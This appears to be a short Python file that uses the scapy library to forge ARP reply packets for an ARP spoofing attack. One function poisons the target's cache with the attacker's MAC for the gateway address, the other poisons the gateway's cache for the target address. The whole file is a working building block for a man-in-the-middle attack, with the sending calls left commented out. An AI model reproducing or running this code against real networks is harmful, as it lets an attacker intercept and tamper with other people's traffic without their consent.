from scapy.all import *
import os
import sys


def spoof_target(gateway_ip,target_ip,target_mac,attacker_mac):
        trame= Ether(type=0x0806)
        packet = ARP()
        packet.hwlen = 6
        packet.plen = 4
        packet.op = 2
        packet.psrc = gateway_ip
        packet.pdst = target_ip
        packet.hwsrc = attacker_mac
        packet.hwdst = target_mac
        total = trame / packet
        return total

#total = spoof_target(gateway_ip,target_ip,target_mac,attacker_mac)

def spoof_gateway(gateway_ip,target_ip,attacker_mac,gateway_mac):

        trame1 = Ether(type=0x0806)
        packet1 = ARP()
        packet1.hwlen = 6
        packet1.plen = 4
        packet1.op = 2
        packet1.psrc = target_ip
        packet1.pdst = gateway_ip
        packet1.hwsrc = attacker_mac
        packet1.hwdst =  gateway_mac
        total1 = trame1 / packet1
        return total1

#total1 = spoof_gateway(gateway_ip,target_ip,attacker_mac,gateway_mac)

